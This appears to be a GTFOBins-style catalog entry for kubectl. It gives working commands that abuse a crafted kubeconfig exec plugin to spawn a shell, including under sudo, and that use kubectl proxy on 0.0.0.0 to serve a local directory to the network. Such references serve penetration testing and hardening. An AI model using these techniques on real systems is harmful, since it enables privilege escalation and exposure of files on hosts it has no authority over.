---
type: gtfobin
name: kubectl
platform: Unix
functions: [shell, upload]
tags: [gtfobin, unix, lotl]
---

# kubectl

## shell

```bash
cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file
```
_The shell is spawn multiple times._
**Contexts:** sudo, unprivileged

## upload

```bash
kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
```
**Contexts:** sudo, suid, unprivileged
